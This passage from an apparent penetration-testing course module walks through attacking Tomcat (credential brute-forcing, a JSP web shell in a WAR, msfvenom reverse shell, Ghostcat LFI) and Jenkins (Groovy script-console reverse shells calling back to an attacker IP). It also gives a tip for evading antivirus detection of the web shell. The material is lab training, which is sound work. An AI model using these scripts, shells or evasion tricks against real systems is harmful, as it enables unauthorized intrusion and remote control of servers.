parser.add_argument(<span class="hljs-string">"-p"</span>, <span class="hljs-string">"--passwords"</span>, <span class="hljs-attr">type</span> = str, <span class="hljs-attr">required</span> = True, <span class="hljs-attr">help</span> = <span class="hljs-string">"Passwords Files"</span>)

<span class="hljs-attr">args</span> = parser.parse_args()

<span class="hljs-attr">url</span> = args.url
<span class="hljs-attr">uri</span> = args.path
<span class="hljs-attr">users_file</span> = args.usernames
<span class="hljs-attr">passwords_file</span> = args.passwords

<span class="hljs-attr">new_url</span> = url + uri
<span class="hljs-attr">f_users</span> = open(users_file, <span class="hljs-string">"rb"</span>)
<span class="hljs-attr">f_pass</span> = open(passwords_file, <span class="hljs-string">"rb"</span>)
<span class="hljs-attr">usernames</span> = [x.strip() for x <span class="hljs-keyword">in</span> f_users]
<span class="hljs-attr">passwords</span> = [x.strip() for x <span class="hljs-keyword">in</span> f_pass]

cprint(<span class="hljs-string">"\n[+] Atacking....."</span>, <span class="hljs-string">"red"</span>, <span class="hljs-attr">attrs</span> = ['bold'])

for u <span class="hljs-keyword">in</span> usernames:
    for p <span class="hljs-keyword">in</span> passwords:
        <span class="hljs-attr">r</span> = requests.get(new_url,<span class="hljs-attr">auth</span> = (u, p))

        <span class="hljs-keyword">if</span> r.<span class="hljs-attr">status_code</span> == <span class="hljs-number">200</span>:
            cprint(<span class="hljs-string">"\n[+] Success!!"</span>, <span class="hljs-string">"green"</span>, <span class="hljs-attr">attrs</span> = ['bold'])
            cprint(<span class="hljs-string">"[+] Username : {}\n[+] Password : {}"</span>.format(u,p), <span class="hljs-string">"green"</span>, <span class="hljs-attr">attrs</span> = ['bold'])
            break
    <span class="hljs-keyword">if</span> r.<span class="hljs-attr">status_code</span> == <span class="hljs-number">200</span>:
        break

<span class="hljs-keyword">if</span> r.status_code != <span class="hljs-number">200</span>:
    cprint(<span class="hljs-string">"\n[+] Failed!!"</span>, <span class="hljs-string">"red"</span>, <span class="hljs-attr">attrs</span> = ['bold'])
    cprint(<span class="hljs-string">"[+] Could not Find the creds :( "</span>, <span class="hljs-string">"red"</span>, <span class="hljs-attr">attrs</span> = ['bold'])
<span class="hljs-comment">#print r.status_code</span>
</code></pre>
<p>This is a very straightforward script that takes a few arguments. We can run the script with <code>-h</code> to see what it requires to run.</p>
<p>Attacking Tomcat</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python3 mgr_brute.py  -h

usage: mgr_brute.py [-h] -U URL -P PATH -u USERNAMES -p PASSWORDS

Tomcat manager or host-manager credential bruteforcing

optional arguments:
  -<span class="ruby">h, --help            show this help message <span class="hljs-keyword">and</span> exit
</span>  -<span class="ruby">U URL, --url URL     URL to tomcat page
</span>  -<span class="ruby">P PATH, --path PATH  manager <span class="hljs-keyword">or</span> host-manager URI
</span>  -<span class="ruby">u USERNAMES, --usernames USERNAMES
</span>                        Users File
  -<span class="ruby">p PASSWORDS, --passwords PASSWORDS
</span>                        Passwords Files
</code></pre>
<p>We can try out the script with the default Tomcat users and passwords file that the above Metasploit module uses. We run it and get a hit!</p>
<p>Attacking Tomcat</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ python3 mgr_brute.py -U http:/</span><span class="hljs-regexp">/web01.inlanefreight.local:8180/</span> -P <span class="hljs-regexp">/manager -u /</span>usr<span class="hljs-regexp">/share/</span>metasploit-framework<span class="hljs-regexp">/data/</span>wordlists<span class="hljs-regexp">/tomcat_mgr_default_users.txt -p /</span>usr<span class="hljs-regexp">/share/</span>metasploit-framework<span class="hljs-regexp">/data/</span>wordlists/tomcat_mgr_default_pass.txt

[+] Atacking.....

[+] Success!!
[+] <span class="hljs-string">Username :</span> b<span class="hljs-string">'tomcat'</span>
[+] <span class="hljs-string">Password :</span> b<span class="hljs-string">'admin'</span>
</code></pre>
<p>If you are interested in scripting, check out the modules <a href="https://academy.hackthebox.com/course/preview/introduction-to-python-3">Introduction to Python 3</a> and <a href="https://academy.hackthebox.com/course/preview/introduction-to-bash-scripting">Introduction to Bash Scripting</a>. A neat exercise would be creating our own Tomcat Manager brute-force login scripts using Python and Bash, but we&#39;ll leave that exercise up to you.</p>
<hr>
<h3 id="tomcat-manager-war-file-upload">Tomcat Manager - WAR File Upload</h3>
<p>Many Tomcat installations provide a GUI interface to manage the application. This interface is available at <code>/manager/html</code> by default, which only users assigned the <code>manager-gui</code> role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application. A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage.</p>
<p>After performing a brute force attack and answering questions 1 and 2 below, browse to <code>http://web01.inlanefreight.local:8180/manager/html</code> and enter the credentials.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/tomcat\_mgr.png" alt=""></p>
<p>The manager web app allows us to instantly deploy new applications by uploading WAR files. A WAR file can be created using the zip utility. A JSP web shell such as <a href="https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp">this</a> can be downloaded and placed within the archive.</p>
<p>Code: java</p>
<pre><code class="lang-java"><span class="xml"></span><span class="vbscript">&lt;%@ page import=<span class="hljs-string">"java.util.*,java.io.*"</span>%&gt;</span><span class="xml">
</span><span class="vbscript">&lt;%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: <span class="hljs-number">27</span>/<span class="hljs-number">06</span>/<span class="hljs-number">2003</span>
//
%&gt;</span><span class="xml">
<span class="hljs-tag">&lt;<span class="hljs-name">HTML</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">BODY</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">FORM</span> <span class="hljs-attr">METHOD</span>=<span class="hljs-string">"GET"</span> <span class="hljs-attr">NAME</span>=<span class="hljs-string">"myform"</span> <span class="hljs-attr">ACTION</span>=<span class="hljs-string">""</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">INPUT</span> <span class="hljs-attr">TYPE</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">NAME</span>=<span class="hljs-string">"cmd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">INPUT</span> <span class="hljs-attr">TYPE</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">VALUE</span>=<span class="hljs-string">"Send"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">FORM</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>
</span><span class="vbscript">&lt;%
<span class="hljs-keyword">if</span> (<span class="hljs-built_in">request</span>.getParameter(<span class="hljs-string">"cmd"</span>) != <span class="hljs-literal">null</span>) {
        out.println(<span class="hljs-string">"Command: "</span> + <span class="hljs-built_in">request</span>.getParameter(<span class="hljs-string">"cmd"</span>) + <span class="hljs-string">"&lt;BR&gt;"</span>);
        Process p = Runtime.getRuntime().exec(<span class="hljs-built_in">request</span>.getParameter(<span class="hljs-string">"cmd"</span>));
        OutputStream os = p.getOutputStream();
        InputStream <span class="hljs-keyword">in</span> = p.getInputStream();
        DataInputStream dis = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-keyword">in</span>);
        <span class="hljs-built_in">String</span> disr = dis.readLine();
        <span class="hljs-keyword">while</span> ( disr != <span class="hljs-literal">null</span> ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%&gt;</span><span class="xml">
<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">BODY</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">HTML</span>&gt;</span></span>
</code></pre>
<p>Attacking Tomcat</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/<span class="hljs-keyword">cmd</span>.<span class="bash">jsp
</span>root@htb[/htb]$ zip -r backup.war <span class="hljs-keyword">cmd</span>.<span class="bash">jsp 
</span>
  adding: <span class="hljs-keyword">cmd</span>.<span class="bash">jsp (deflated 81%)</span>
</code></pre>
<p>Click on <code>Browse</code> to select the .war file and then click on <code>Deploy</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/mgr\_deploy.png" alt="image"></p>
<p>This file is uploaded to the manager GUI, after which the <code>/backup</code> application will be added to the table.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/war\_deployed.png" alt=""></p>
<p>If we click on <code>backup</code>, we will get redirected to <code>http://web01.inlanefreight.local:8180/backup/</code> and get a <code>404 Not Found</code> error. We need to specify the <code>cmd.jsp</code> file in the URL as well. Browsing to <code>http://web01.inlanefreight.local:8180/backup/cmd.jsp</code> will present us with a web shell that we can use to run commands on the Tomcat server. From here, we could upgrade our web shell to an interactive reverse shell and continue. Like previous examples, we can interact with this web shell via the browser or using <code>cURL</code> on the command line. Try both!</p>
<p>Attacking Tomcat</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl http://web01.inlanefreight.local:8180/<span class="hljs-keyword">backup</span>/cmd.jsp?cmd=<span class="hljs-keyword">id</span>

&lt;HTML&gt;&lt;<span class="hljs-keyword">BODY</span>&gt;
&lt;<span class="hljs-keyword">FORM</span> METHOD=<span class="hljs-string">"GET"</span> <span class="hljs-keyword">NAME</span>=<span class="hljs-string">"myform"</span> <span class="hljs-keyword">ACTION</span>=<span class="hljs-string">""</span>&gt;
&lt;<span class="hljs-keyword">INPUT</span> <span class="hljs-keyword">TYPE</span>=<span class="hljs-string">"text"</span> <span class="hljs-keyword">NAME</span>=<span class="hljs-string">"cmd"</span>&gt;
&lt;<span class="hljs-keyword">INPUT</span> <span class="hljs-keyword">TYPE</span>=<span class="hljs-string">"submit"</span> <span class="hljs-keyword">VALUE</span>=<span class="hljs-string">"Send"</span>&gt;
&lt;/<span class="hljs-keyword">FORM</span>&gt;
&lt;pre&gt;
Command: <span class="hljs-keyword">id</span>&lt;BR&gt;
uid=<span class="hljs-number">1001</span>(tomcat) gid=<span class="hljs-number">1001</span>(tomcat) <span class="hljs-keyword">groups</span>=<span class="hljs-number">1001</span>(tomcat)

&lt;/pre&gt;
&lt;/<span class="hljs-keyword">BODY</span>&gt;&lt;/HTML&gt;
</code></pre>
<p>To clean up after ourselves, we can go back to the main Tomcat Manager page and click the <code>Undeploy</code> button next to the <code>backups</code> application after, of course, noting down the file and upload location for our report, which in our example is <code>/opt/tomcat/apache-tomcat-10.0.10/webapps</code>. If we do an <code>ls</code> on that directory from our web shell, we&#39;ll see the uploaded <code>backup.war</code> file and the <code>backup</code> directory containing the <code>cmd.jsp</code> script and <code>META-INF</code> created after the application deploys. Clicking on <code>Undeploy</code> will typically remove the uploaded WAR archive and the directory associated with the application.</p>
<p>We could also use <code>msfvenom</code> to generate a malicious WAR file. The payload <a href="https://github.com/iagox86/metasploit-framework-webexec/blob/master/modules/payloads/singles/java/jsp\_shell\_reverse\_tcp.rb">java/jsp_shell_reverse_tcp</a> will execute a reverse shell through a JSP file. Browse to the Tomcat console and deploy this file. Tomcat automatically extracts the WAR file contents and deploys it.</p>
<p>Attacking Tomcat</p>
<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ msfvenom -p java/</span>jsp_shell_reverse_tcp LHOST=<span class="hljs-number">10.10</span>.<span class="hljs-number">14.15</span> LPORT=<span class="hljs-number">4443</span> -f war &gt; backup.war

Payload <span class="hljs-keyword">size</span>: <span class="hljs-number">1098</span> bytes
<span class="hljs-keyword">Final</span> <span class="hljs-keyword">size</span> of war <span class="hljs-keyword">file</span>: <span class="hljs-number">1098</span> bytes
</code></pre>
<p>Start a Netcat listener and click on <code>/backup</code> to execute the shell.</p>
<p>Attacking Tomcat</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nc -lnvp <span class="hljs-number">4443</span>

listening on [any] <span class="hljs-number">4443</span> ...
connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.15</span>] from (UNKNOWN) [<span class="hljs-number">10.129</span><span class="hljs-number">.201</span><span class="hljs-number">.58</span>] <span class="hljs-number">45224</span>


id

uid=<span class="hljs-number">1001</span>(tomcat) gid=<span class="hljs-number">1001</span>(tomcat) groups=<span class="hljs-number">1001</span>(tomcat)
</code></pre>
<p>The <a href="https://www.rapid7.com/db/modules/exploit/multi/http/tomcat\_mgr\_upload/">multi/http/tomcat_mgr_upload</a> Metasploit module can be used to automate the process shown above, but we&#39;ll leave this as an exercise for the reader.</p>
<p><a href="https://github.com/SecurityRiskAdvisors/cmd.jsp">This</a> JSP web shell is very lightweight (under 1kb) and utilizes a <a href="https://www.freecodecamp.org/news/what-are-bookmarklets/">Bookmarklet</a> or browser bookmark to execute the JavaScript needed for the functionality of the web shell and user interface. Without it, browsing to an uploaded <code>cmd.jsp</code> would render nothing. This is an excellent option to minimize our footprint and possibly evade detections for standard JSP web shells (though the JSP code may need to be modified a bit).</p>
<p>The web shell as is only gets detected by 2/58 anti-virus vendors.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/vt2.png" alt="image"></p>
<p>A simple change such as changing:</p>
<p>Code: java</p>
<pre><code class="lang-java">FileOutputStream<span class="hljs-comment">(f)</span>;stream.write<span class="hljs-comment">(m)</span>;o=<span class="hljs-string">"Uploaded:</span>
</code></pre>
<p>to:</p>
<p>Code: java</p>
<pre><code class="lang-java">FileOutputStream<span class="hljs-comment">(f)</span>;stream.write<span class="hljs-comment">(m)</span>;o=<span class="hljs-string">"uPlOaDeD:</span>
</code></pre>
<p>results in 0/58 security vendors flagging the <code>cmd.jsp</code> file as malicious at the time of writing.</p>
<hr>
<h3 id="a-quick-note-on-web-shells">A Quick Note on Web shells</h3>
<p>When we upload web shells (especially on externals), we want to prevent unauthorized access. We should take certain measures such as a randomized file name (i.e., MD5 hash), limiting access to our source IP address, and even password protecting it. We don&#39;t want an attacker to come across our web shell and leverage it to gain their own foothold.</p>
<hr>
<h3 id="cve-2020-1938-ghostcat">CVE-2020-1938 : Ghostcat</h3>
<p>Tomcat was found to be vulnerable to an unauthenticated LFI in a semi-recent discovery named <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1938">Ghostcat</a>. All Tomcat versions before 9.0.31, 8.5.51, and 7.0.100 were found vulnerable. This vulnerability was caused by a misconfiguration in the AJP protocol used by Tomcat. AJP stands for Apache Jserv Protocol, which is a binary protocol used to proxy requests. This is typically used in proxying requests to application servers behind the front-end web servers.</p>
<p>The AJP service is usually running at port 8009 on a Tomcat server. This can be checked with a targeted Nmap scan.</p>
<p>Attacking Tomcat</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nmap -sV -<span class="hljs-selector-tag">p</span> <span class="hljs-number">8009</span>,<span class="hljs-number">8080</span> app-dev<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span>

Starting Nmap <span class="hljs-number">7.80</span> ( https:<span class="hljs-comment">//nmap.org ) at 2021-09-21 20:05 EDT</span>
Nmap scan report <span class="hljs-keyword">for</span> app-dev<span class="hljs-selector-class">.inlanefreight</span><span class="hljs-selector-class">.local</span> (<span class="hljs-number">10.129</span>.<span class="hljs-number">201.58</span>)
Host is up (<span class="hljs-number">0.14s</span> latency).

PORT     STATE SERVICE VERSION
<span class="hljs-number">8009</span>/tcp open  ajp13   Apache Jserv (Protocol v1.<span class="hljs-number">3</span>)
<span class="hljs-number">8080</span>/tcp open  http    Apache Tomcat <span class="hljs-number">9.0</span>.<span class="hljs-number">30</span>

Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span>
Nmap done: <span class="hljs-number">1</span> IP <span class="hljs-selector-tag">address</span> (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">9.36</span> seconds
</code></pre>
<p>The above scan confirms that ports 8080 and 8009 are open. The PoC code for the vulnerability can be found <a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">here</a>. Download the script and save it locally. The exploit can only read files and folders within the web apps folder, which means that files like <code>/etc/passwd</code> can’t be accessed. Let’s attempt to access the web.xml.</p>
<p>Attacking Tomcat</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 

Getting resource at ajp13://app-dev.inlanefreight.local:8009/asdf
----------------------------
<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-comment">&lt;!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://xmlns.jcp.org/xml/ns/javaee"</span>
  <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>
  <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">"http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span>
  <span class="hljs-attr">version</span>=<span class="hljs-string">"4.0"</span>
  <span class="hljs-attr">metadata-complete</span>=<span class="hljs-string">"true"</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>Welcome to Tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>
     Welcome to Tomcat
  <span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span>
</code></pre>
<p>In some Tomcat installs, we may be able to access sensitive data within the WEB-INF file.</p>
<hr>
<h3 id="moving-on">Moving On</h3>
<p>Tomcat is always a great find on internal and external penetration tests. Whenever we come across it, we should test the Tomcat Manager area for weak/default credentials. If we can log in, we can quickly turn this access into remote code execution. It’s common to find Tomcat running as high-privileged users such as SYSTEM or root, so it is always worth digging into as it could provide us with a privileged foothold on a Linux server or a domain-joined Windows server in an Active Directory environment.</p>
<h2 id="jenkins-discovery-enumeration">Jenkins - Discovery &amp; Enumeration</h2>
<hr>
<p><a href="https://www.jenkins.io/">Jenkins</a> is an open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat. Over the years, researchers have uncovered various vulnerabilities in Jenkins, including some that allow for remote code execution without requiring authentication. Jenkins is a <a href="https://en.wikipedia.org/wiki/Continuous\_integration">continuous integration</a> server. Here are a few interesting points about Jenkins:</p>
<ul>
<li>Jenkins was originally named Hudson (released in 2005) and was renamed in 2011 after a dispute with Oracle</li>
<li><a href="https://discovery.hgdata.com/product/jenkins">Data</a> shows that over 86,000 companies use Jenkins</li>
<li>Jenkins is used by well-known companies such as Facebook, Netflix, Udemy, Robinhood, and LinkedIn</li>
<li>It has over 300 plugins to support building and testing projects</li>
</ul>
<hr>
<h3 id="discovery-footprinting">Discovery/Footprinting</h3>
<p>Let&#39;s assume we are working on an internal penetration test and have completed our web discovery scans. We notice what we believe is a Jenkins instance and know it is often installed on Windows servers running as the all-powerful SYSTEM account. If we can gain access via Jenkins and gain remote code execution as the SYSTEM account, we would have a foothold in Active Directory to begin enumeration of the domain environment.</p>
<p>Jenkins runs on Tomcat port 8080 by default. It also utilizes port 5000 to attach slave servers. This port is used to communicate between masters and slaves. Jenkins can use a local database, LDAP, Unix user database, delegate security to a servlet container, or use no authentication at all. Administrators can also allow or disallow users from creating accounts.</p>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p><img src="https://academy.hackthebox.com/storage/modules/113/jenkins\_global\_security.png" alt=""></p>
<p>The default installation typically uses Jenkins’ database to store credentials and does not allow users to register an account. We can fingerprint Jenkins quickly by the telltale login page.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/jenkins\_login.png" alt=""></p>
<p>We may encounter a Jenkins instance that uses weak or default credentials such as <code>admin:admin</code> or does not have any type of authentication enabled. It is not uncommon to find Jenkins instances that do not require any authentication during an internal penetration test. While rare, we have come across Jenkins during external penetration tests that we were able to attack.</p>
<h2 id="attacking-jenkins">Attacking Jenkins</h2>
<hr>
<p>We&#39;ve confirmed that the host is running Jenkins, and it is configured with weak credentials. Let&#39;s check and see what type of access this will give us.</p>
<p>Once we have gained access to a Jenkins application, a quick way of achieving command execution on the underlying server is via the <a href="https://www.jenkins.io/doc/book/managing/script-console/">Script Console</a>. The script console allows us to run arbitrary Groovy scripts within the Jenkins controller runtime. This can be abused to run operating system commands on the underlying server. Jenkins is often installed in the context of the root or SYSTEM account, so it can be an easy win for us.</p>
<hr>
<h3 id="script-console">Script Console</h3>
<p>The script console can be reached at the URL <code>http://jenkins.inlanefreight.local:8000/script</code>. This console allows a user to run Apache <a href="https://en.wikipedia.org/wiki/Apache\_Groovy">Groovy</a> scripts, which are an object-oriented Java-compatible language. The language is similar to Python and Ruby. Groovy source code gets compiled into Java Bytecode and can run on any platform that has JRE installed.</p>
<p>Using this script console, it is possible to run arbitrary commands, functioning similarly to a web shell. For example, we can use the following snippet to run the <code>id</code> command.</p>
<p>Code: groovy</p>
<pre><code class="lang-groovy"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">cmd</span> </span>= 'id'
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sout</span> </span>= new StringBuffer(), serr = new StringBuffer()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">proc</span> </span>= cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(<span class="hljs-number">1000</span>)
println sout
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/113/groovy\_web.png" alt=""></p>
<p>There are various ways that access to the script console can be leveraged to gain a reverse shell. For example, using the command below, or <a href="https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins\_script\_console/">this</a> Metasploit module.</p>
<p>Code: groovy</p>
<pre><code class="lang-groovy">r = Runtime.getRuntime()
<span class="hljs-selector-tag">p</span> = r.exec([<span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"exec 5&lt;&gt;/dev/tcp/10.10.14.15/8443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])
<span class="hljs-selector-tag">p</span>.waitFor()
</code></pre>
<p>Running the above commands results in a reverse shell connection.</p>
<p>Attacking Jenkins</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nc -lvnp <span class="hljs-number">8443</span>

listening <span class="hljs-literal">on</span> [any] <span class="hljs-number">8443</span> ...
connect <span class="hljs-keyword">to</span> [<span class="hljs-number">10.10</span>.<span class="hljs-number">14.15</span>] <span class="hljs-keyword">from</span> (UNKNOWN) [<span class="hljs-number">10.129</span>.<span class="hljs-number">201.58</span>] <span class="hljs-number">57844</span>

id

uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)

/bin/bash -i

root@app02:/<span class="hljs-keyword">var</span>/lib/jenkins3<span class="hljs-comment">#</span>
</code></pre>
<p>Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">Invoke-PowerShellTcp.ps1</a>. We could run commands on a Windows-based Jenkins install using this snippet:</p>
<p>Code: groovy</p>
<pre><code class="lang-groovy">def <span class="hljs-keyword">cmd</span><span class="bash"> = <span class="hljs-string">"cmd.exe /c dir"</span>.execute();
</span>println(<span class="hljs-string">"${cmd.text}"</span>);
</code></pre>
<p>We could also use <a href="https://gist.githubusercontent.com/frohoff/fed1ffaab9b9beeb1c76/raw/7cfa97c7dc65e2275abfb378101a505bfb754a95/revsh.groovy">this</a> Java reverse shell to gain command execution on a Windows host, swapping out <code>localhost</code> and the port for our IP address and listener port.</p>
<p>Code: groovy</p>
<pre><code class="lang-groovy"><span class="hljs-keyword">String</span> host=<span class="hljs-string">"localhost"</span>;
<span class="hljs-keyword">int</span> port=<span class="hljs-number">8044</span>;
<span class="hljs-keyword">String</span> cmd=<span class="hljs-string">"cmd.exe"</span>;
<span class="hljs-built_in">Process</span> p=<span class="hljs-keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=<span class="hljs-keyword">new</span> Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span class="hljs-built_in">while</span>(!s.isClosed()){<span class="hljs-built_in">while</span>(pi.<span class="hljs-built_in">available</span>()&gt;<span class="hljs-number">0</span>)so.<span class="hljs-built_in">write</span>(pi.<span class="hljs-built_in">read</span>());<span class="hljs-built_in">while</span>(pe.<span class="hljs-built_in">available</span>()&gt;<span class="hljs-number">0</span>)so.<span class="hljs-built_in">write</span>(pe.<span class="hljs-built_in">read</span>());<span class="hljs-built_in">while</span>(si.<span class="hljs-built_in">available</span>()&gt;<span class="hljs-number">0</span>)po.<span class="hljs-built_in">write</span>(si.<span class="hljs-built_in">read</span>());so.<span class="hljs-built_in">flush</span>();po.<span class="hljs-built_in">flush</span>();Thread.sleep(<span class="hljs-number">50</span>);<span class="hljs-built_in">try</span> {p.<span class="hljs-built_in">exitValue</span>();<span class="hljs-built_in">break</span>;}<span class="hljs-built_in">catch</span> (Exception e){}};p.destroy();s.<span class="hljs-built_in">close</span>();
</code></pre>
<hr>
<h3 id="miscellaneous-vulnerabilities">Miscellaneous Vulnerabilities</h3>
<p>Several remote code execution vulnerabilities exist in various versions of Jenkins. One recent exploit combines two vulnerabilities, CVE-2018-1999002 and <a href="https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266">CVE-2019-1003000</a> to achieve pre-authenticated remote code execution, bypassing script security sandbox protection during script compilation. Public exploit PoCs exist to exploit a flaw in Jenkins dynamic routing to bypass the Overall / Read ACL and use Groovy to download and execute a malicious JAR file. This flaw allows users with read permissions to bypass sandbox protections and execute code on the Jenkins master server. This exploit works against Jenkins version 2.137.</p>
<p>Another vulnerability exists in Jenkins 2.150.2, which allows users with JOB creation and BUILD privileges to execute code on the system via Node.js. This vulnerability requires authentication, but if anonymous users are enabled, the exploit will succeed because these users have JOB creation and BUILD privileges by default.</p>
<p>As we have seen, gaining access to Jenkins as an administrator can quickly lead to remote code execution. While several working RCE exploits exist for Jenkins, they are version-specific. At the time of writing, the current LTS release of Jenkins is 2.303.1, which fixes the two flaws detailed above. As with any application or system, it is important to harden Jenkins as much as possible since built-in functionality can be easily used to take over the underlying server.</p>
<hr>
<h3 id="shifting-gears">Shifting Gears</h3>
<p>We&#39;ve covered various ways that popular CMS&#39; and servlet containers/software development applications can be abused to exploit both known vulnerabilities and built-in functionality. Let&#39;s shift our focus a bit to two well-known infrastructure/network monitoring tools: Splunk and PRTG Network Monitor.</p>
<h2 id="splunk-discovery-enumeration">Splunk - Discovery &amp; Enumeration</h2>
<hr>
<p>Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics. Splunk deployments are often used to house sensitive data and could provide a wealth of information for an attacker if compromised. Historically, Splunk has not suffered from many known vulnerabilities aside from an information disclosure vulnerability (CVE-2018-11409) and an authenticated remote code execution vulnerability in very old versions (CVE-2011-4642). Here are a few <a href="https://www.splunk.com/en\_us/customers.html">details</a> about Splunk:</p>
<ul>
<li>Splunk was founded in 2003, first became profitable in 2009, and had its initial public offering (IPO) in 2012 on NASDAQ under the symbol SPLK</li>
<li>Splunk has over 7,500 employees and annual revenue of nearly $2.4 billion</li>
<li>In 2020, Splunk was named to the Fortune 1000 list</li>
<li>Splunk&#39;s clients include 92 companies on the Fortune 100 list</li>
<li><a href="https://splunkbase.splunk.com/">Splunkbase</a> allows Splunk users to download apps and add-ons for Splunk. As of 2021, there are over 2,000 available apps</li>
</ul>
<p>We will more often than not see Splunk during our assessments, especially in large corporate environments during internal penetration tests. We have seen it exposed externally, but this is rarer. Splunk does not suffer from many exploitable vulnerabilities and is quick to patch any issues. The biggest focus of Splunk during an assessment would be weak or null authentication because admin access to Splunk gives us the ability to deploy custom applications that can be used to quickly compromise a Splunk server and possibly other hosts in the network depending on the way Splunk is set up.</p>
<hr>
<h3 id="discovery-footprinting">Discovery/Footprinting</h3>
<p>Splunk is prevalent in internal networks and often runs as root on Linux or SYSTEM on Windows systems. While uncommon, we may encounter Splunk externally facing at times. Let&#39;s imagine that we uncover a forgotten instance of Splunk in our Aquatone report that has since automatically converted to the free version, which does not require authentication. Since we have yet to gain a foothold in the internal network, let&#39;s focus our attention on Splunk and see if we can turn this access into RCE.</p>
<p>The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are <code>admin:changeme</code>, which are conveniently displayed on the login page.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/changme.png" alt="image"></p>
